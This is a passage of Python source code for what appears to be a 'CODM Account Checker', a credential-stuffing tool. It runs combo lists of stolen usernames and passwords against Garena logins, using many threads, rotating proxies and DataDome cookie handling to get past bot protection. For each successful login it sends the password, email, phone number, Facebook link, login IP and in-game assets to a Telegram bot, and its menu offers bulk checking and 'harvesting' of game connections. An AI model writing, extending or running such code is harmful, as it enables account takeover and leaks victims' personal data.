                print(f'  {_DIM}Config saved for next time.{_RST}')
        print()
        print(f'  {_GN}✔  Telegram configured.{_RST}')
        if TG_SEND_CLEAN:
            print(f'  {_DIM}Clean hits  : Level {_GN}{TG_LVL_MIN_CLEAN}–{TG_LVL_MAX_CLEAN}{_RST}')
        if TG_SEND_NOTCLEAN:
            print(f'  {_DIM}Not-clean   : Level {_RD}{TG_LVL_MIN_NOTCLEAN}–{TG_LVL_MAX_NOTCLEAN}{_RST}')
        print()
    def _send_tg(token, chat_id, text, silent=False):
        try:
            import requests as _req
            html_text = f'<pre><code>{text}</code></pre>'
            payload = {'chat_id': chat_id, 'text': html_text, 'parse_mode': 'HTML', 'disable_notification': silent}
            _req.post(f'https://api.telegram.org/bot{token}/sendMessage', json=payload, timeout=8)
        except Exception:
            pass
    def _build_tg_message(acc, pwd, ad, is_clean_hit):
        lvl = ad.get('codm_level', 0)
        region = ad.get('codm_region', 'N/A')
        nick = ad.get('codm_nickname', 'N/A')
        uid = ad.get('uid', 'N/A')
        country = ad.get('country', 'N/A')
        fb = ad.get('fb_info', 'N/A')
        fb_link = ad.get('fb_link', 'N/A')
        fb_username = ad.get('fb_username', 'N/A')
        shell = ad.get('shell_balance', 0)
        email_d = ad.get('email_display', 'N/A')
        mobile = ad.get('formatted_mobile', 'N/A')
        login_d = ad.get('last_login_date', 'N/A')
        login_w = ad.get('last_login_where', 'N/A')
        login_ip = ad.get('last_login_ip', 'N/A')
        login_country = ad.get('last_login_country', 'N/A')
        username = ad.get('username', 'N/A')
        nickname = ad.get('nickname', 'N/A')
        bind_status = ad.get('bind_status', 'N/A')
        game_connections = ad.get('game_connections', [])
        tag = '✔ CLEAN' if is_clean_hit else '⊘ NOT CLEAN'
        lines = [f"{'✔ CLEAN HIT' if is_clean_hit else '⊘ NOT CLEAN HIT'}", f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'Account : {acc} : {pwd}', f'Status  : {tag}', f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'Username    : {username}', f'Nickname    : {nickname}', f'UID         : {uid}', f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'Email       : {email_d}', f'Mobile      : {mobile}', f'Facebook    : {fb}', f'FB Username : {fb_username}']
        if fb_link != 'N/A':
            lines.append(f'FB Link     : {fb_link}')
        lines.extend([f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'Shells      : {shell:,}', f'Bind Status : {bind_status}', f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'CODM Level  : {lvl}', f'CODM Region : {region}', f'CODM IGN    : {nick}', f'CODM UID    : {ad.get("codm_uid", "N/A")}', f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'Country     : {country}', f'Last Login  : {login_d}', f'Login Via   : {login_w}', f'Login IP    : {login_ip}', f'Login Loc   : {login_country}'])
        if game_connections and CHECK_OTHER_GAMES:
            lines.append(f'━━━━━━━━━━━━━━━━━━━━━━━━━━')
            lines.append(f'Game Connections:')
            for g in game_connections:
                gname = g.get('game', 'Unknown')
                grole = g.get('role', 'N/A')
                gregion = g.get('region', '')
                lines.append(f'• {gname}: {grole} ({gregion})' if gregion else f'• {gname}: {grole}')
        lines.extend([f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'Powered by: @Markdev'])
        return '\n'.join(lines)
    def _maybe_send_tg(account_data):
        if account_data.get('is_error') or not account_data.get('has_codm'):
            return
        is_clean = account_data.get('is_clean', False)
        lvl = account_data.get('codm_level', 0)
        acc = account_data.get('account', '')
        pwd = account_data.get('password', '')
        msg = _build_tg_message(acc, pwd, account_data, is_clean)
        if TG_ENABLED:
            if is_clean and TG_SEND_CLEAN and (TG_LVL_MIN_CLEAN <= lvl <= TG_LVL_MAX_CLEAN):
                threading.Thread(target=_send_tg, args=(TG_BOT_TOKEN, TG_CHAT_ID, msg, False), daemon=True).start()
            elif not is_clean and TG_SEND_NOTCLEAN and (TG_LVL_MIN_NOTCLEAN <= lvl <= TG_LVL_MAX_NOTCLEAN):
                threading.Thread(target=_send_tg, args=(TG_BOT_TOKEN, TG_CHAT_ID, msg, False), daemon=True).start()
    global _TG_HOOK
    _TG_HOOK = _maybe_send_tg
    clear_screen()
    dashboard = BulkLiveDashboard(len(accounts), max_threads=num_threads)
    dashboard.start()
    overall_done = 0
    account_index_counter = [0]
    index_lock = threading.Lock()
    stats_lock = threading.Lock()
    global _suppress_ip_prints, _ip_block_callback
    _suppress_ip_prints = True
    def _ip_block_cb(blocked: bool):
        dashboard.set_ip_blocked(blocked)
    _ip_block_callback = _ip_block_cb
    _thread_local = threading.local()
    def _get_thread_resources():
        if not hasattr(_thread_local, 'session') or not hasattr(_thread_local, 'datadome'):
            _thread_local.session = requests.Session()
            _thread_local.datadome = DataDomeManager()
            _thread_local.proxy_url = None
            _thread_local.proxy_line = None
            if using_proxy and proxy_manager and proxy_manager.enabled:
                proxy = proxy_manager.get_next()
                if proxy:
                    _thread_local.session.proxies.update(proxy)
                    _thread_local.proxy_url = proxy.get('http') or proxy.get('https')
                    _thread_local.proxy_line = proxy_manager._index
                    dashboard.set_current_proxy(proxy=_thread_local.proxy_url, line=_thread_local.proxy_line)
            proxy_dict = dict(_thread_local.session.proxies) if using_proxy and proxy_manager and proxy_manager.enabled else None
            valid_cookies = cookie_manager.get_valid_cookies()
            if valid_cookies:
                combined = '; '.join(valid_cookies)
                applyck(_thread_local.session, combined)
                dd_line = valid_cookies[-1]
                if 'datadome=' in dd_line:
                    for part in dd_line.split(';'):
                        part = part.strip()
                        if part.startswith('datadome='):
                            _thread_local.datadome.set_datadome(part.split('=', 1)[1].strip())
                            break
            else:
                dd = get_datadome_cookie(_thread_local.session, proxies=proxy_dict)
                if dd:
                    _thread_local.datadome.set_datadome(dd)
        return (_thread_local.session, _thread_local.datadome)
    def _worker(account_line):
        if ':' not in account_line:
            return ('DONE', account_line, {})
        try:
            account, password = account_line.split(':', 1)
            account, password = account.strip(), password.strip()
            session, datadome_mgr = _get_thread_resources()
            status = processaccount(session, account, password, cookie_manager, datadome_mgr, live_stats, results_manager, file_manager, selected_file, auto_remove, suppress_print=True, proxy_manager=proxy_manager if using_proxy else None)
            return (status, account, {})
        except Exception:
            return ('ERROR', account_line, {})
    def _wrapped_worker(account_line):
        nonlocal overall_done
        with index_lock:
            account_index_counter[0] += 1
            my_index = account_index_counter[0]
        acc_name = account_line.split(':', 1)[0].strip() if ':' in account_line else account_line
        while True:
            status, acc_name, _ = _worker(account_line)
            if status == 'IP_CHANGED':
                if hasattr(_thread_local, 'session'):
                    try:
                        _thread_local.session.close()
                    except Exception:
                        pass
                    del _thread_local.session
                if hasattr(_thread_local, 'datadome'):
                    del _thread_local.datadome
                if using_proxy and proxy_manager and proxy_manager.enabled:
                    proxy = proxy_manager.get_next()
                    if proxy:
                        proxy_url = proxy.get('http') or proxy.get('https')
                        proxy_line = proxy_manager._index
                        dashboard.set_current_proxy(proxy=proxy_url, line=proxy_line)
                time.sleep(2)
                continue
            break
        result_info = live_stats.pop_result()
        if result_info and result_info['success']:
            shell_balance = result_info.get('shell_balance', 0)
            dashboard.record(my_index, acc_name, success=True, is_clean=result_info['is_clean'], has_codm=result_info['has_codm'], codm_level=result_info['codm_level'], shell_balance=shell_balance)
        else:
            dashboard.record(my_index, acc_name, success=False, error_reason=(result_info or {}).get('error_reason', 'Invalid'))
        with stats_lock:
            overall_done += 1
    try:
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = {executor.submit(_wrapped_worker, ln): ln for ln in accounts}
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    with stats_lock:
                        overall_done += 1
    except KeyboardInterrupt:
        _log('WARNING', 'Interrupted — shutting down...')
    finally:
        dashboard.stop()
        sys.stdout.write('\x1b[H\x1b[J')
        sys.stdout.flush()
    _suppress_ip_prints = False
    _ip_block_callback = None
    print()
    live_stats.display_final_stats()
    _flush_auto_remove(file_manager, selected_file, force=True)
    print(f'  {_DIM}Results saved in real-time to Results/{_RST}')
    print()
    input(f'  {_DIM}Press Enter to return to menu{_RST} ')

def single_check():
    clear_screen()
    display_banner()
    console = Console()
    
    console.print(Panel(
        Text("SINGLE CHECK", style="bold bright_white") + Text(" — enter credentials below", style="dim"),
        border_style="bright_magenta",
        box=box.ROUNDED,
        expand=False
    ))
    print()
    
    cookie_manager = CookieManager()
    datadome_manager = DataDomeManager()
    
    while True:
        global CHECK_OTHER_GAMES
        check_games = input(f'  {_CY}◇{_RST}  Check game connections? (y/N) {_CY}❯{_RST} ').strip().lower() == "y"
        
        if check_games:
            CHECK_OTHER_GAMES = True
            _log('INFO', '[dim]Will scan all Garena game connections[/dim]')
        else:
            CHECK_OTHER_GAMES = False
            _log('INFO', '[dim]CODM only — skipping other game checks[/dim]')
        
        print()
        
        live_stats = LiveStats()
        live_stats.total_accounts = 1
        
        session = requests.Session()
        cookie_manager = CookieManager()
        datadome_manager = DataDomeManager()
        
        valid_cookies = cookie_manager.get_valid_cookies()
        if valid_cookies:
            combined = '; '.join(valid_cookies)
            applyck(session, combined)
            dd_line = valid_cookies[-1]
            for part in dd_line.split(';'):
                part = part.strip()
                if part.startswith('datadome='):
                    datadome_manager.set_datadome(part.split('=', 1)[1].strip())
                    break
        else:
            proxy_dict = dict(session.proxies) if session.proxies else None
            datadome = get_datadome_cookie(session, proxies=proxy_dict)
            if datadome:
                datadome_manager.set_datadome(datadome)
                datadome_manager.set_session_datadome(session, datadome)
        
        account = input(f'  {_CY}❯ Username/Email{_RST}  {_CY}❯{_RST} ').strip()
        if not account:
            _log('ERROR', 'Username/Email cannot be empty.')
            print()
            continue
        
        password = input(f'  {_CY}❯ Password{_RST}  {_CY}❯{_RST} ').strip()
        if not password:
            _log('ERROR', 'Password cannot be empty.')
            print()
            continue
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        results_manager = ResultsManager(combo_file_path=Path('SingleCheck'), create_dirs=False)
        results_manager.base_dir = Path(f'Single Check Output/{timestamp}')
        
        if CHECK_OTHER_GAMES:
            (results_manager.base_dir / 'Games').mkdir(parents=True, exist_ok=True)
        
        _log('INFO', f'[dim]Checking: [bold bright_cyan]{account}[/bold bright_cyan]…[/dim]')
        print()
        
        processaccount(
            session,
            account,
            password,
            cookie_manager,
            datadome_manager,
            live_stats,
            results_manager,
            file_manager=None,
            combo_file_path=None,
            auto_remove=False,
            use_elegant_display=True,
            suppress_print=False
        )
        
        console.print(Panel(
            Text("SAVE RESULT?", style="bold bright_white") + Text(" (y/n)", style="dim"),
            border_style="bright_yellow",
            box=box.ROUNDED,
            expand=False
        ))
        save_response = input(f'\n  {_YL}❯{_RST} ').strip().lower()
        
        if save_response == 'y':
            for sub in ('Country', 'Level', 'Games', 'Garena Shells'):
                (results_manager.base_dir / sub).mkdir(parents=True, exist_ok=True)
            _log('SAVE', f'Saved to [bright_cyan]{results_manager.base_dir}[/bright_cyan]')
        else:
            _log('INFO', '[dim]Result discarded — not saved.[/dim]')
        
        console.print(Panel(
            Text("CHECK ANOTHER?", style="bold bright_white") + Text(" (y/n)", style="dim"),
            border_style="bright_magenta",
            box=box.ROUNDED,
            expand=False
        ))
        continue_response = input(f'\n  {_MG}❯{_RST} ').strip().lower()
        
        if continue_response != 'y':
            break
        
        session.close()
        _log('INFO', '[dim]↺  Refreshing session for next check…[/dim]')
        time.sleep(1)
        clear_screen()
        display_banner()
        console.print(Panel(
            Text("SINGLE ACCOUNT CHECK", style="bold bright_white"),
            border_style="bright_magenta",
            box=box.ROUNDED,
            expand=False
        ))
        print()

def display_main_menu() -> str:
    cols = shutil.get_terminal_size((80, 20)).columns
    width = min(max(cols - 6, 44), 64)

    def top_bar() -> str:
        return f"  {_BLU}╭{'─' * (width + 2)}╮{_RST}"
    def bottom_bar() -> str:
        return f"  {_BLU}╰{'─' * (width + 2)}╯{_RST}"
    def divider() -> str:
        return f"  {_BLU}├{'─' * (width + 2)}┤{_RST}"
    def blank() -> str:
        return row("")

    def row(content: str) -> str:
        pad = width - _visible_len(content)
        return f"  {_BLU}│{_RST} {content}{' ' * max(pad, 0)} {_BLU}│{_RST}"

    def option(key: str, accent: str, label: str, desc: str) -> str:
        key_part = f"{_DIM}[{_RST}{_BRT}{_WH}{key}{_RST}{_DIM}]{_RST}"
        label_part = f"  {_BRT}{accent}{label}{_RST}"
        desc_part = f"  {_SL}{_ITL}{desc}{_RST}"
        return row(f"{key_part}{label_part}{desc_part}")

    hint = f"{_SL}type 1 · 2 · 3 · 4  then  ↵  enter{_RST}"
    def footer() -> str:
        pad = width - _visible_len(hint)
        return f"  {_BLU}│{_RST} {' ' * (pad // 2)}{hint}{' ' * (pad - pad // 2)} {_BLU}│{_RST}"

    icon = f"{_BLU}◆{_RST}"
    title = f"{_BRT}{_WH}SELECT MODE{_RST}"
    title_row = row(f"  {icon}  {title}")

    lines = [
        "",
        top_bar(),
        title_row,
        divider(),
        blank(),
        option("1", _GR, "Bulk Check   ", "scan a combo file"),
        option("2", _MG, "Single Check ", "check one account"),
        option("3", _YL, "Validator    ", "login-only · no game data"),
        option("4", _CY, "Game Hunter  ", "harvest specific game connections"),
        blank(),
        divider(),
        footer(),
        bottom_bar(),
        "",
    ]

    for i, line in enumerate(lines):
        print(line)
        if i < 4:
            time.sleep(0.018)

    while True:
        try:
            choice = input(f"  {_BLU}❯{_RST}  ").strip()
            if choice in ("1", "2", "3", "4"):
                labels = {"1": (_GR, "Bulk Check"),
                          "2": (_MG, "Single Check"),
                          "3": (_YL, "Validator"),
                          "4": (_CY, "Game Hunter")}
                c, name = labels[choice]
                print(f"\n  {c}✔{_RST}  {_BRT}{_WH}{name}{_RST}{_DIM} selected{_RST}\n")
                return choice
            _log("ERROR", "Enter 1, 2, 3, or 4.")
        except KeyboardInterrupt:
            print()
            return "3"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    clear_screen()

    ascii_art = r"""
MMMMMMMMMMMMO                                                           .NMMMMMMMMMMMMMM
MMMMMMMMMMWd                                                             .KMMMMMMMMMMMMM
MMMMMMMMNx.,l                                                              xMMMMMMMMMMMM
MMMMMMWK:'lN.                                                               l0MMMMMMMMMM
MMMMMN0;xkN:                                                               ..0KKNMMMMMMM
MMMMNKlXMOO                                                                ;.'WMNNMMMMMM
MMMMNOWMM0;                                                                .d.OMMMMMMMMM
MMMMNMMMMx ;,                                                               0xcMMMMMMMMM
MMMMMMMXllKO                                                                xWdMMMMMMMMM
MMMMNX00WMN.                                                                xN0MMMMMMMMM
MMMMMMMMMW'                                                                 :00MMMMMMMMM
MMMMMMMMMl O.                                                               .cXMMMMMMMMM
MMMMMMMMX,oM.                                                             . lOxkNMMMMMMM
MMMMMMMMdKxM;                     .                 .                      ,lMMMNNMMMMMM
MMMMMMMMOMKO..                   .,  .             .;. ..                  0lMMMMMMMMMMM
MMMMMMMMNWd:Oo.                 ...                .......              .' oxMMMMMMMMMMM
MMMMMMMWNXWMWK'                 ... .             .......               .Kk'dMMMMMMMMMMM
MMMMMMMMMMMMXO: . .        ..........           .......'',.             ;MMMXNMMMMMMMMMM
MMMMMMMMMMWNNM0 O;'        ...,;;,,,'..      . '::::::;;,,''       .. :OlMMMMMMMMMMMMMMM
MMMMMMMMMMMMMWO:KW:...  . ..,;::cc:c::.    .,.,:cccccccc:::..    ..c;'NN0MMMMMMMMMMMMMMM
MMMMMMMMMMMMMWMONWK:'.   ..:;::cccccc:,;,.;:::ccccccccccc:,',   .,oOXkMWMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMWMMMNd;:. ':::ccccccccccccccccccccccccccccc::.. .cdKMMWMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMK:..,:cccccccccccccccccccccccccccccccc::o .:NMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMx  .:cccccccccccccccccccccccccccccccccO, .kMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMk'  .:cccccccccccc:',,,';cccccccccccc0l  'xMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMXW;; .:cccccccccccc;''';:cccccccccccO:. xNxWMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMW0.. ;:ccccccccc:::::;::c:::::::dd';kOMMMWMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMWkc  .;:::cc:;,'....'',;:::::lo' :kWMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMWMN    .;::::::,...',;:::::cc.   kMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMK.'    .,:::::::::;;;;;::.     OMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMW' .;.  .   .;;;;;;;;;;;,.        ;XMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMW   ,;'.''..  .,;;;;;,.            dMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMM.    ..,;;;,.   ...               xMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMM'       ..',,'                    dMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMM.                                 ;XMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMXc'.                                    ;0WMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMW0:                                           :XMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMWO:.                                               'dXMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMN0d:.                                                      .ckNMMMMMMMMMMMMMM
MMMMMMMXd;.                                                               .lONMMMMMMMMMM
MMN0d;.                                                                       .;lkXWMMMM
..                                                                                  'cxX
"""

    art_width = max(len(line) for line in ascii_art.splitlines() if line)

    print(f"  {_MG}┏{'━' * (art_width + 2)}┓{_RST}")

    for line in ascii_art.splitlines():
        if line:
            print(f"  {_MG}┃{_RST} {line.ljust(art_width)} {_MG}┃{_RST}")

    print(f"  {_MG}┗{'━' * (art_width + 2)}┛{_RST}")
    print()

    w = _w(74)

    banner_lines = [
    r"███╗   ███╗█████╗ ██████╗ ██╗  ██╗",
    r"████╗ ████║██╔══██╗██╔══██╗██║ ██╔╝",
    r"██╔████╔██║███████║██████╔╝█████═╝ ",
    r"██║╚██╔╝██║██╔══██║██╔══██╗██╔═██╗ ",
    r"██║ ╚═╝ ██║██║  ██║██║  ██║██║  ██╗",
    r"╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝",
]

    # Yung natitirang existing code mo, huwag galawin

    print(f"\n  {_MG}┏{'━' * w}┓{_RST}")

    for line in banner_lines:
        print(f"  {_MG}┃{_RST}{_MG}{line}{_RST}{' ' * (w - len(line))}{_MG}┃{_RST}")
        time.sleep(0.032)

    print(f"  {_MG}┣{'━' * w}┫{_RST}")

    tool = f"{_BRT}{_WH}CODM Account Checker{_RST}"
    version = f"{_GD}v2.0{_RST}"
    author = f"{_DIM}By{_RST} {_MG}{_BRT}@Markdev{_RST}"

    left = f"  {tool}  {version}"
    right = f"{author}  "

    import re
    def vlen(s): return len(re.sub(r"\033\[[0-9;]*m", "", s))

    total_visible = vlen(left) + vlen(right)
    gap = max(w - total_visible, 1)
    print(f"  {_MG}┃{_RST}{left}{' ' * gap}{right}{_MG}┃{_RST}")

    print(f"  {_MG}┗{'━' * w}┛{_RST}")
    print()

def main():
    while True:
        clear_screen()
        display_banner()
        choice = display_main_menu()
        if choice == '1':
            bulk_check()
        elif choice == '2':
            single_check()
        elif choice == '3':
            validator_check()
        elif choice == '4':
            game_connections_hunter()
            
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f'\n  {_YL}⚠  Script terminated by user.{_RST}\n')
    except Exception as e:
        import traceback
        error_msg = str(e)
        print(f'\n  {_RD}✖  Unexpected error: {error_msg}{_RST}')
        traceback.print_exc()
        try:
            with open('error_log.txt', 'a', encoding='utf-8') as f:
                f.write(f'[{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}] ERROR: {error_msg}\n')
                f.write(traceback.format_exc())
                f.write('\n' + '-'*60 + '\n')
        except Exception:
            pass